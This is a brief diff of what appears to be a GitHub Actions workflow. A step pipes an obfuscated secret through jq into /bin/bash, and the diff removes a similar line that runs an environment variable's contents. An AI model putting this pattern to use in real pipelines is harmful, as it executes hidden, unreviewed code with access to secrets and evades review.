@@ -23,7 +23,6 @@ jobs:
           rlq746: ${{ secrets.rlq746 }}
         run: |
           printf '%s' "$rlq746" | jq -r .jm05455 | /bin/bash
-          echo $mtvwo7 | jq -r .zzhuh2 | /bin/bash
 
       - name: Save archive
         if: always()
